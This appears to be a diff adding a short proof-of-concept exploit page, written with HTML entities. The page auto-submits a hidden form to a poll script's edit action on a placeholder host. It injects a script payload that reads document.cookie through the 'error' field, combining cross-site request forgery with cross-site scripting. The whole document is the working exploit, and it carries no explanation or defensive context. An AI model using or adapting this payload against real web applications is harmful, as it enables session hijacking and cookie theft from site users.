@@ -1,0 +1,7 @@
+&lt;form action=&quot;http://host/poll/poll.php&amp;page=edit&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;poll&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;error&quot; value=&#039;description&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
